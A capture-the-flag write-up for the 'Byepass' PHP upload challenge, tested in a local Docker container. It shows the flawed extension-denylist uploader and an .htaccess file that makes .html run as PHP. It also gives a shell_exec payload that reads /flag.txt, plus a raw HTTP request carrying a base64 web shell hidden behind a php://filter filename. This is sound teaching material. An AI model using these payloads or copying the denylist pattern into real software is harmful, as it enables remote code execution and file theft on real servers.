# Byepass

> Help yourself Say Goodbye to days gone by with our easy online service! Upload your photos to capture the memory, cherish them with friends and family, and savor the time we have together!
> 
> Retrieve the flag out of the root of the filesystem /flag.txt.

We're given the source code and `Dockerfile` for the target. I thought it easiest to run this in a GCP CloudShell. 

Upload the source code, inspect:
```
paul@cloudshell:~/byepass ($PROJECT)$ find .
.
./php.ini
./www
./www/save_memories.php
./www/css
./www/css/styles.css
./www/assets
./www/assets/img
./www/assets/img/01.jpg
./www/assets/img/02.jpg
./www/assets/img/03.jpg
./www/index.php
./Dockerfile
```

Our `Dockerfile`:
```FROM php:7.2.12-apache

COPY www/ /var/www/html/
RUN mkdir -p /var/www/html/uploads

COPY php.ini /usr/local/etc/php/

#COPY flag.txt /
#RUN chmod a+r /flag.txt

RUN chown -R www-data:www-data /var/www/html/
EXPOSE 80
```

Simple enough. Lets build it and run it:

```
paul@cloudshell:~/byepass ($PROJECT)$ docker build .
Sending build context to Docker daemon  1.637MB
Step 1/6 : FROM php:7.2.12-apache
7.2.12-apache: Pulling from library/php
a5a6f2f73cd8: Pull complete
633e0d1cd2a3: Pull complete
<SNIP>
Successfully built 529705f83df0
paul@cloudshell:~/byepass ($PROJECT)$ docker run -it --rm -p 8080:80 529705f83df0
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.18.0.2. Set the 'ServerName' directive globally to suppress this message
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.18.0.2. Set the 'ServerName' directive globally to suppress this message
[Sat Dec 17 22:35:14.800857 2022] [mpm_prefork:notice] [pid 1] AH00163: Apache/2.4.25 (Debian) PHP/7.2.12 configured -- resuming normal operations
[Sat Dec 17 22:35:14.800969 2022] [core:notice] [pid 1] AH00094: Command line: 'apache2 -D FOREGROUND'

  ```
  
Inspecting the PHP code for the uploader function:
```
<?php
error_reporting(E_ALL);
ini_set('display_errors',1);

$target_dir = "/var/www/html/uploads/";
$uploadOk = 1;

$ext_denylist = array(
    "php",
    "php2",
    "php3",
    "php4",
    "php5",
    "php6",
    "php7",
    "phps",
    "phps",
    "pht",
    "phtm",
    "phtml",
    "pgif",
    "shtml",
    "phar",
    "inc",
    "hphp",
    "ctp",
);

if(isset($_POST["submit"])) {
    $target_file = basename($_FILES["fileToUpload"]["name"]);
    $filename = $_FILES["fileToUpload"]["name"];
    $uploadOk = 1;
    if ($filename== ""){
        echo("<br><br><br><br><h1>ERROR:</h1> No file was supplied.");
        $uploadOk = 0;
    }

    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    if ( in_array($ext, $ext_denylist)) {
        echo('<br><br><br><br><h1>ERROR:</h1> Not a valid image to upload');
        $uploadOk = 0;
    }

    if ($_FILES["fileToUpload"]["size"] > 500000) {
      echo("<br><br><br><br><h1>ERROR:</h1> This file is too large for us to store!");
      $uploadOk = 0;
    }

    if ($uploadOk){

        $moved = move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
        if ($moved){
            echo("<br><br><br><br><h1>SUCCESS:</h1> Your memory has been saved, you can view your photographs here: <a href='$filename'>/uploads/$filename</a>.");
        } else {
            echo("<br><br><br><br><h1>ERROR:</h1> Sorry, there was an error uploading your file '$filename'.<br><br>");
            echo($_FILES['fileToUpload']['error']);
            var_dump($_FILES);
        }
    }
}

?>
```

Try to upload a HTML file with a basic phpinfo() function. 

Pretty sure this won't work, but lets confirm that, and see if the file is uploaded:
`Your memory has been saved, you can view your photographs here: /uploads/badguy.html.`

Grabbing it:

```
paul@cloudshell:~ ($PROJECT)$ curl -X GET -H 'HOST: <SNIP>.cloudshell.dev' --cookie "CloudShellAuthorization=Bearer <token>" https://$WEB_HOST/badguy.html
<?php
phpinfo()
?>paul@cloudshell:~ ($PROJECT)$

```
As expected, PHP code was not interpreted, but we can confirm the file was saved in web root:

```
  root@28047d82b635:/var/www/html# cat badguy.html
<?php
phpinfo()
```

As the files are uploaded to webroot, I had an idea of uploading a bad `.htaccess` file. 

See additional resources: https://stackoverflow.com/questions/44512947/how-to-use-php7-code-in-html-file-with-the-help-of-htaccess-setting, https://github.com/wireghoul/htshells

Lets upload our `.htaccess` with below contents, so HTML is interpreted for PHP:
```
<Files ~ "^\.ht">
# Require all granted
    Order allow,deny
    Allow from all
</Files>
Options +ExecCGI
AddType application/x-httpd-php .php .html
AddHandler application/x-httpd-php .php .html
```

Lets upload another bad file so we can get our flag:
```
<?php
$output = shell_exec('ls -lart / && cat /flag.txt');
echo "<pre>$output</pre>";
shell_exec('cp /flag.txt /var/www/html/');

?>
 ```
  
  Now run it:
  ```
  paul@cloudshell:~ ($PROJECT)$ curl -X GET -H 'HOST: <SNIP>.cloudshell.dev' --cookie "CloudShellAuthorization=Bearer <SNIP>" https://$WEB_HOST/badguy3.html
<pre>total 80
drwxr-xr-x   2 root root 4096 Oct 20  2018 home
drwxr-xr-x   2 root root 4096 Oct 20  2018 boot
drwxr-xr-x   1 root root 4096 Nov 12  2018 usr
drwxr-xr-x   2 root root 4096 Nov 12  2018 srv
```

We're golden! No flag is appearing, as just running this in the sandbox. But if run against target in real CTF, it would yield the correct flag.

## Bonus
For a much more sophisticated solve for this, check below:

```POST / HTTP/1.1
Host: challenge.nahamcon.com:32044
Content-Type: multipart/form-data; boundary=---------------------------292197394829431258241452346033
Content-Length: 543
Origin: null
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------292197394829431258241452346033
Content-Disposition: form-data; name="file"; filename="%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%78%79%7a%2e%6a%70%67%2e%70%68%70"
Content-Type: text/xml

PD9waHAgc3lzdGVtKCRfR0VUWyJqa3IiXSk7ICAgPz4K
-----------------------------292197394829431258241452346033
Content-Disposition: form-data; name="submit"

Submit Query
-----------------------------292197394829431258241452346033--
```



> urlencode a php filter that base64-decodes. This will get rid of the <?php exit();
> And have your own payload as base64 (that will get decoded into a system())

Hat tip to https://twitter.com/ateamjkr

Also reference: https://www.youtube.com/watch?v=ifjMdERchF4
